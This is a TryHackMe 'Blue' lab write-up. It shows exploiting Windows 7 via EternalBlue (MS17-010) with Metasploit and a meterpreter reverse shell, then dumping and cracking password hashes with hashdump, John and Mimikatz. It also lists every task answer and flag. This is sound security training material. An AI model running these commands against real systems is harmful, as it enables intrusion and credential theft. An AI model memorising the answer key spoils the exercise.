# 🔵 Blue

- **Platform:** TryHackMe
- **URL:** https://tryhackme.com/room/blue
- **Difficulty:** Easy
- **Category:** Windows / Network
- **Date Completed:** 2026-02-15
- **Status:** ✅ Complete (100%)
- **Time Taken:** 1 hour

---

## 📋 Task Answers

| Task | Question | Answer |
|------|----------|--------|
| 1 | Scan the machine. How many ports are open with a port number under 1000? | `3` |
| 2 | What is this machine vulnerable to? (CVE) | `CVE-2017-0144` |
| 3 | Find the exploitation code we will run against the machine. What is the module path? | `exploit/windows/smb/ms17_010_eternalblue` |
| 4 | Show options and set the one required value. What is the name of this value? | `RHOSTS` |
| 5 | Run the exploit! What is the user level of the shell? | `NT AUTHORITY\SYSTEM` |
| 6 | What is the name of the non-default user? | `Jon` |
| 7 | What is the password of this user? | `alqfna22` |
| 8 | What is the flag in the root directory? | `flag{access_the_machine}` |
| 9 | What is the flag in the location where passwords are stored? | `flag{sam_database_elevated_access}` |
| 10 | What is the flag in a directory with important files? | `flag{admin_documents_can_be_valuable}` |
| 11 | What is the name of the tool we used to dump hashes? | `Mimikatz` |

---

## 🔍 Reconnaissance

### Connectivity Check

```bash
ping -c 4 10.10.x.x
Nmap Scan
bash
nmap -sV -sC -p- 10.10.x.x -T4
Results:

text
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Key Findings:

Port 135: MSRPC

Port 139: NetBIOS

Port 445: SMB (Windows 7 Professional)

Port 3389: RDP

Ports under 1000: 3 (135, 139, 445)

OS: Windows 7 Professional SP1

Vulnerability Identified
The target is Windows 7 SP1 with SMBv1 enabled — vulnerable to MS17-010 (EternalBlue).

CVE: CVE-2017-0144

💥 Exploitation
Step 1: Launch Metasploit
bash
msfconsole
Step 2: Search for EternalBlue Module
bash
msf6 > search ms17-010
Result:

text
exploit/windows/smb/ms17_010_eternalblue
Step 3: Select the Module
bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
Step 4: Configure the Exploit
bash
msf6 > show options
Required option: RHOSTS

bash
msf6 > set RHOSTS 10.10.x.x
msf6 > set LHOST 10.10.x.x
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
Step 5: Run the Exploit
bash
msf6 > run
Output:

text
[*] Started reverse TCP handler on 10.10.x.x:4444
[*] 10.10.x.x:445 - Connecting to target for exploitation.
[+] 10.10.x.x:445 - Connection established for exploitation.
[+] 10.10.x.x:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.x.x:445 - CORE raw buffer dump (42 bytes)
[+] 10.10.x.x:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.x.x:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.x.x:445 - Sending all but last fragment of exploit packet
[*] 10.10.x.x:445 - Starting non-paged pool grooming
...
[+] 10.10.x.x:445 - ETERNALBLUE overwrite completed successfully!
[+] 10.10.x.x:445 - Sending egg to corrupted connection.
[+] 10.10.x.x:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.x.x
[*] Meterpreter session 1 opened
User Level: NT AUTHORITY\SYSTEM (highest privilege on Windows)

🚀 Post-Exploitation
Step 1: Confirm Access
bash
meterpreter > getuid
Output: Server username: NT AUTHORITY\SYSTEM

Step 2: Migrate to Stable Process
bash
meterpreter > ps
Find a stable process like spoolsv.exe (PID ~1000-1500):

bash
meterpreter > migrate <PID>
Step 3: Dump Password Hashes
bash
meterpreter > hashdump
Output:

text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
Non-default user: Jon

Step 4: Crack Jon's Password
Use an online hash cracker or John the Ripper:

bash
echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > jon_hash.txt
john jon_hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
Password: alqfna22

Step 5: Alternative — Use Mimikatz
bash
meterpreter > load kiwi
meterpreter > creds_all
Tool used: Mimikatz (via Kiwi extension)

🏁 Finding Flags
Flag 1: Root Directory
bash
meterpreter > shell
C:\> cd C:\
C:\> dir
C:\> type flag1.txt
Flag 1: flag{access_the_machine}

Flag 2: SAM Database Location
bash
C:\> cd C:\Windows\System32\config
C:\> type flag2.txt
Flag 2: flag{sam_database_elevated_access}

Flag 3: Admin Documents
bash
C:\> cd C:\Users\Jon\Documents
C:\> dir
C:\> type flag3.txt
Flag 3: flag{admin_documents_can_be_valuable}

🛠️ Tools Used
Tool	Purpose
Nmap	Port scanning & service detection
Metasploit	Exploitation framework
MS17-010 EternalBlue	SMBv1 exploit module
Meterpreter	Post-exploitation payload
Mimikatz (Kiwi)	Credential dumping
John the Ripper	Hash cracking
🧠 Key Takeaways
Legacy systems are dangerous — Windows 7 without patches is trivially exploitable with EternalBlue.

SMBv1 should be disabled — It's the root cause of MS17-010 and many other critical vulnerabilities.

EternalBlue is one of the most impactful exploits ever — Used in WannaCry and NotPetya ransomware attacks.

NT AUTHORITY\SYSTEM is the highest privilege — No privilege escalation needed once exploited.

Password hash dumping is powerful — SAM database contains all local account hashes.

Mimikatz is essential for Windows pentesting — Extracts credentials from memory.

Always migrate processes — Migrating to a stable process prevents shell crashes.

Never stop at initial access — Post-exploitation reveals flags, credentials, and lateral movement paths.

🔗 References
TryHackMe Room: https://tryhackme.com/room/blue

CVE-2017-0144: https://nvd.nist.gov/vuln/detail/CVE-2017-0144

MS17-010 Bulletin: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

EternalBlue Explained: https://www.avast.com/c-eternalblue

Mimikatz GitHub: https://github.com/gentilkiwi/mimikatz

⚠️ Disclaimer
These writeups are for educational purposes only. All techniques were performed in authorized TryHackMe labs. Never use these methods on systems without explicit permission.
